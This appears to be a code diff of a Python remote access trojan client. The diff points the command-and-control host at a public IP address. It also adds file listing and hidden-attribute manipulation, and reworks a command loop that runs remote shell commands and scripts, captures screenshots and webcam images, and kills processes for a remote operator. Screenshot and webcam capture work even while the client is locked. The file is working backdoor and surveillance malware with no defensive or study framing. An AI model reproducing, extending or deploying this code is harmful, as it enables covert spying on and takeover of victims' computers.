@@ -1,3 +1,4 @@
+
 # -*- coding: utf-8 -*-
 # !/usr/bin/python
 
@@ -15,7 +16,7 @@ import sched
 import datetime
 import zlib
 
-HOST = '127.0.0.1'
+HOST = '109.172.189.74'
 PORT = 4434
 ACTIVE = False
 GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,6 +38,8 @@ while 1:
                 continue
         try:
             ACTIVE = True
+
+            # TODO: SOURCE START
 
             UNLOCKED = False
             SECRET = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123
@@ -150,11 +153,7 @@ while 1:
 
 
             def init():
-                if os.path.exists('info.nfo'):
-                    variables = open('info.nfo', 'r').read()
-                    return ast.literal_eval(variables)
-                else:
-                    variables = {
+                variables = {
                         'i': '',
                         'kts': False,
                         'kt': 30,
@@ -165,6 +164,13 @@ while 1:
                         'std': 20,
                         'st': 30,
                     }
+                if os.path.exists('info.nfo'):
+                    variables = open('info.nfo', 'r').read()
+                    try:
+                        return ast.literal_eval(variables)
+                    except:
+                        return variables
+                else:
                     open('info.nfo', 'w').write(str(variables))
                     return variables
 
@@ -285,7 +291,10 @@ while 1:
                     if updatecode.has_key(k):
                         return updatecode[k]
                     else:
-                        return str(chr(k))
+                        try:
+                            return str(chr(k))
+                        except:
+                            return '{UnknownKeyCode: %s}' % k
 
                 @staticmethod
                 def write_key(log):
@@ -522,6 +531,41 @@ while 1:
                 else:
                     return "Enter a command.\n"
 
+            # Get Content
+            def ls():
+                string = {
+                    'path': os.getcwdu()
+                }
+                try:
+                    for n, i in enumerate(os.listdir(u'.')):
+                        string[n] = {
+                            'name': i,
+                            'type': os.path.isfile(i),
+                            'size': os.path.getsize(i),
+                            'modified': time.ctime(os.path.getmtime(i)),
+                            'hidden': has_hidden_attribute(i)
+                        }
+                    return str(string)
+                except WindowsError:
+                    return 'windowsError'
+
+            # Check Hidden Attribute
+            def has_hidden_attribute(filepath):
+                try:
+                    attrs = Kernel32.GetFileAttributesW(unicode(filepath))
+                    assert attrs != -1
+                    result = bool(attrs & 2)
+                except (AttributeError, AssertionError):
+                    result = False
+                return result
+
+            # Set Hidden Attribute
+            def set_content_attribute(filepath):
+                if has_hidden_attribute:
+                    Kernel32.SetFileAttributesW(filepath, 1)
+                else:
+                    Kernel32.SetFileAttributesW(filepath, 2)
+
             # Get Processes
             def get_processes_list():
                 PROCESSES = {}
@@ -577,133 +621,140 @@ while 1:
                 while 1:
 
                     while ACTIVE:
-                        try:
 
-                            key = get_key()
-                            if len(key) != 0:
-                                ID = key
-                                data_send(key, 'clientInitializing')
-                            else:
-                                data_send('noKey', 'clientInitializing')
-                                new_key = data_receive()
-                                set_key(new_key['payload'])
-                                ID = new_key['payload']
+                        key = get_key()
+                        if len(key) != 0:
+                            ID = key
+                            data_send(key, 'clientInitializing')
+                        else:
+                            data_send('noKey', 'clientInitializing')
+                            new_key = data_receive()
+                            set_key(new_key['payload'])
+                            ID = new_key['payload']
 
-                            info_sernder_thread = threading.Thread(target=send_info)
-                            info_sernder_thread.start()
+                        info_sernder_thread = threading.Thread(target=send_info)
+                        info_sernder_thread.start()
 
-                            # After Initialized
-                            while ACTIVE:
-                                data = data_receive()
+                        # After Initialized
+                        while ACTIVE:
+                            data = data_receive()
 
-                                if len(data['payload']) == 0 and len(data['mode']) == 0:
-                                    break
-
-                                if data['mode'] == 'unlockClient':
-                                    pass_key = data['payload']
-                                    if pass_key == SECRET:
-                                        UNLOCKED = True
-
-                                        data_send('loginSuccess', 'loginSuccess', session_id=data['session_id'])
-
-                                        while UNLOCKED:
-
-                                            try:
-                                                data = data_receive()
-
-                                                # Lock Client
-                                                if data['mode'] == 'lockClient':
-                                                    UNLOCKED = False
-                                                    continue
-
-                                                # Terminate Client
-                                                if data['mode'] == 'terminateClient':
-                                                    os._exit(1)
-
-
-
-                                                # TODO: TEMP
-                                                elif data['payload'] == 'raiseException':
-                                                    raise ValueError('Manually Generated Exception')
-
-                                                # Explorer Commands
-                                                elif data['mode'] == 'explorerMode' and data['payload'].startswith('cd '):
-                                                    try:
-                                                        os.chdir(data['payload'][3:])
-                                                        output = ''
-                                                    except:
-                                                        output = 'dirOpenError'
-
-                                                # Execute Script
-                                                elif data['mode'] == 'scriptingMode':
-                                                    output = executeScript(data['payload'])
-
-                                                # Get Desktop Preview
-                                                elif data['mode'] == 'getScreen':
-                                                    output = get_screenshot()
-
-                                                # Get Webcam Preview
-                                                elif data['mode'] == 'getWebcam':
-                                                    output = webcam_shot()
-
-                                                # Get Processes List
-                                                elif data['mode'] == 'processesMode':
-                                                    output = get_processes_list()
-
-                                                # Terminate Process
-                                                elif data['mode'] == 'terminateProcess':
-                                                    terminateProcess(data['payload'])
-                                                    continue
-
-                                                # Shell Mode
-                                                elif data['mode'] == 'shellMode':
-                                                    output = run_shell(data['payload'])
-
-                                                # Run Shell
-                                                else:
-                                                    data_send('unknownCommandError', 'unknownCommandError', session_id=data['session_id'])
-                                                    continue
-
-                                                data_send(output, 'clientMode', session_id=data['session_id'])
-
-                                            except socket.error:
-                                                break
-                                            except KeyError:
-                                                break
-
-                                    else:
-                                        data_send('notAuthorized', 'notAuthorized', session_id=data['session_id'])
-
-                                # Lock Client Functions
-                                # Desktop Screenshot
-                                elif data['mode'] == 'getScreen':
-                                    print 'Send Screenshot'
-                                    data_send(get_screenshot(), 'getScreen', session_id=data['session_id'])
-                                    print 'Sent Screenshot'
-                                    continue
-
-                                # Webcamera Shot
-                                elif data['mode'] == 'getWebcam':
-                                    data_send(webcam_shot(), 'getWebcam', session_id=data['session_id'])
-                                    continue
-
-                                else:
-                                    data_send('notAuthorized', 'notAuthorized')
-                                    continue
-
-                            else:
+                            if len(data['payload']) == 0 and len(data['mode']) == 0:
                                 break
 
-                        except socket.error:
-                            GLOBAL_SOCKET.close()
-                            time.sleep(10)
+                            if data['mode'] == 'unlockClient':
+                                pass_key = data['payload']
+                                if pass_key == SECRET:
+                                    UNLOCKED = True
+
+                                    data_send('loginSuccess', 'loginSuccess', session_id=data['session_id'])
+
+                                    while UNLOCKED:
+
+                                        try:
+                                            data = data_receive()
+
+                                            # Lock Client
+                                            if data['mode'] == 'lockClient':
+                                                UNLOCKED = False
+                                                continue
+
+                                            # Terminate Client
+                                            if data['mode'] == 'terminateClient':
+                                                os._exit(1)
+
+
+
+                                            # TODO: TEMP
+                                            elif data['payload'] == 'raiseException':
+                                                raise ValueError('Manually Generated Exception')
+
+                                            # Explorer Commands
+                                            elif data['mode'] == 'explorerMode' and data['payload'].startswith('cd '):
+                                                try:
+                                                    os.chdir(data['payload'][3:])
+                                                    output = ''
+                                                except:
+                                                    output = 'dirOpenError'
+
+                                            elif data['mode'] == 'explorerMode' and data['payload'] == 'getContent':
+                                                output = ls()
+
+                                            # Execute Script
+                                            elif data['mode'] == 'scriptingMode':
+                                                output = executeScript(data['payload'])
+
+                                            # Get Desktop Preview
+                                            elif data['mode'] == 'getScreen':
+                                                output = get_screenshot()
+
+                                            # Get Webcam Preview
+                                            elif data['mode'] == 'getWebcam':
+                                                output = webcam_shot()
+
+                                            # Get Processes List
+                                            elif data['mode'] == 'processesMode':
+                                                output = get_processes_list()
+
+                                            # Terminate Process
+                                            elif data['mode'] == 'terminateProcess':
+                                                terminateProcess(data['payload'])
+                                                continue
+
+                                            # Shell Mode
+                                            elif data['mode'] == 'shellMode' and data['payload'].startswith('cd '):
+                                                try:
+                                                    os.chdir(data['payload'][3:])
+                                                    output = ''
+                                                except:
+                                                    output = 'dirOpenError'
+
+                                            elif data['mode'] == 'shellMode':
+                                                output = run_shell(data['payload'])
+
+                                            # Run Shell
+                                            else:
+                                                data_send('unknownCommandError', 'unknownCommandError', session_id=data['session_id'])
+                                                continue
+
+                                            data_send(output, 'clientMode', session_id=data['session_id'])
+
+                                        except socket.error:
+                                            break
+                                        except KeyError:
+                                            break
+
+                                else:
+                                    data_send('notAuthorized', 'notAuthorized', session_id=data['session_id'])
+
+                            # Locked Client Functions
+                            # Desktop Screenshot
+                            elif data['mode'] == 'getScreen':
+                                data_send(get_screenshot(), 'getScreen', session_id=data['session_id'])
+                                continue
+
+                            # Webcamera Shot
+                            elif data['mode'] == 'getWebcam':
+                                data_send(webcam_shot(), 'getWebcam', session_id=data['session_id'])
+                                continue
+
+                            else:
+                                data_send('notAuthorized', 'notAuthorized')
+                                continue
+
+                        else:
                             break
 
             reactor()
 
+            # TODO: SOURCE END
+
         except Exception as e:
-            GLOBAL_SOCKET.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
             ACTIVE = False
-            time.sleep(60)
+            GLOBAL_SOCKET.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
+            GLOBAL_SOCKET.close()
+            del GLOBAL_SOCKET
+            GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            time.sleep(6)
     except socket.error:
         time.sleep(5)
